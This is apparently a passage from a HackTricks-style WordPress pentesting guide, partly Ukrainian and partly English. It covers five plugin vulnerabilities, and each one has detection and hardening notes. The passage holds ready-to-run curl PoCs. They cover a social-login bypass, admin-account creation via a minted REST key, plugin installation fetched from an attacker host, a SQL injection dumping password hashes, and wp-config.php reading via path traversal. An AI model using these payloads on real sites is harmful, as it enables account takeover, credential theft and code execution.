// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Why it’s exploitable

- Доступна без автентифікації через admin-ajax.php (дія wp_ajax_nopriv_…).
- Відсутні перевірки nonce/capability перед зміною стану.
- Відсутня верифікація провайдера OAuth/OpenID; гілка за замовчуванням приймає введення від нападника.
- get_user_by('email', $_POST['id']) у поєднанні з wp_set_auth_cookie($uid) автентифікують запитувача як будь-яку існуючу електронну адресу.

Exploitation (unauthenticated)

- Передумови: нападник має доступ до /wp-admin/admin-ajax.php і знає/вгадує дійсну електронну адресу користувача.
- Встановіть provider у непідтримуване значення (або опустіть його), щоб потрапити в гілку за замовчуванням і передати id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Очікувані індикатори успіху

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Знаходження назви action

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Шукайте wp_set_auth_cookie(), get_user_by('email', ...) всередині AJAX-обробників.

Чекліст виявлення

- Веб-логи, що показують неаутентифіковані POST-запити до /wp-admin/admin-ajax.php з action social-login і id=<email>.
- 200-відповіді з success JSON безпосередньо перед аутентифікованим трафіком з тієї ж IP/User-Agent.

Зміцнення

- Не виводьте ідентичність із введення клієнта. Приймайте лише emails/IDs, що походять від перевіреного provider token/ID.
- Вимагайте CSRF nonces та перевірки capability навіть для login helpers; уникайте реєстрації wp_ajax_nopriv_ якщо це не суворо необхідно.
- Валідуйте та перевіряйте OAuth/OIDC відповіді на сервері; відхиляйте відсутніх/недійсних провайдерів (без fallback на POST id).
- Розгляньте тимчасове відключення social login або віртуальне патчення на краю (блокувати вразливий action) доки не виправлено.

Поведінка після виправлення (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

Деякі плагіни виставляють REST endpoints, які генерують багаторазові “connection keys” або токени без перевірки capability викликача. Якщо маршрут автентифікує лише за вгадуваним атрибутом (наприклад, username) і не прив'язує ключ до користувача/сесії з перевірками capability, будь-який неаутентифікований атакувальник може згенерувати ключ і викликати привілейовані дії (створення admin-акаунту, дії плагіна → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – згенеруйте connection key і використайте його
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Чому це експлойтабельно
- Чутливий REST route захищений тільки низькоентропійним підтвердженням особи (username) або відсутнім permission_callback
- Відсутня перевірка capability; створений ключ приймається як універсальний обхід

Detection checklist
- Шукати в коді плагіна register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Будь-який route, який видає tokens/keys на основі identity з запиту (username/email) без прив’язки до автентифікованого користувача або capability
- Шукати наступні маршрути, що приймають створений token/key без перевірок capability на сервері

Hardening
- Для будь-якого привілейованого REST route: вимагати permission_callback, який виконує current_user_can() для потрібної capability
- Не створюйте long-lived keys на основі identity, наданої клієнтом; за потреби видавайте short-lived, user-bound tokens після аутентифікації та перевіряйте capability при використанні
- Перевіряйте контекст користувача виклику (wp_set_current_user сам по собі недостатній) і відкидайте запити, де !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → неаутентифікована довільна інсталяція плагіна (FunnelKit Automations ≤ 3.5.3)

Nonces захищають від CSRF, а не від авторизації. Якщо код сприймає проходження nonce як дозвіл і пропускає перевірки capability для привілейованих операцій (наприклад, install/activate plugins), неаутентифіковані атакувальники можуть виконати слабку перевірку nonce і досягти RCE, встановивши плагін із бекдором або вразливий плагін.

- Уразливий шлях: plugin/install_and_activate
- Вразливість: слабка перевірка nonce hash; відсутня current_user_can('install_plugins'|'activate_plugins') після того, як nonce «проходить»
- Наслідок: повне скомпрометування через довільну інсталяцію/активацію плагіна

PoC (форма залежить від плагіна; наведено ілюстративно)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## Неаутентифікований SQLi через параметр s (search) в depicter-* actions (Depicter Slider ≤ 3.6.1)

Кілька depicter-* actions використовували параметр s (search) і конкатенували його в SQL-запити без параметризації.

- Параметр: s (search)
- Вразливість: пряме конкатенування рядків у WHERE/LIKE клаузаx; відсутні prepared statements/санітизація
- Наслідок: екзфільтрація бази даних (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Контрольний список виявлення
- Grep для depicter-* action handlers та прямого використання $_GET['s'] або $_POST['s'] в SQL
- Перегляньте кастомні запити, передані в $wpdb->get_results()/query(), які конкатенують s

Підсилення захисту
- Завжди використовуйте $wpdb->prepare() або wpdb placeholders; відхиляйте небажані метасимволи на стороні сервера
- Додайте строгий allowlist для s і нормалізуйте до очікуваного charset/length

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder ≤ 2.5.1)

Прийом шляхів, контрольованих атакувальником, у параметрі шаблону без нормалізації/обмеження дозволяє читати довільні локальні файли, а іноді — code execution, якщо до runtime підтягуються includable PHP/log файли.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: немає нормалізації/allowlisting; traversal дозволений
- Impact: розкриття секретів (wp-config.php), potential RCE у специфічних середовищах (log poisoning, includable PHP)

PoC – прочитати wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- Будь-який handler, що конкатенує шляхи запитів у include()/require()/read sinks без обмеження через realpath()
- Шукайте traversal-патерни (../), що виходять за межі призначеного каталогу templates

Hardening
- Застосувати allowlisted templates; визначайте шлях через realpath() і вимагайте str_starts_with(realpath(file), realpath(allowed_base))
- Нормалізувати вхідні дані; відхиляти traversal-послідовності та абсолютні шляхи; використовувати sanitize_file_name() тільки для імен файлів (не для повних шляхів)


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
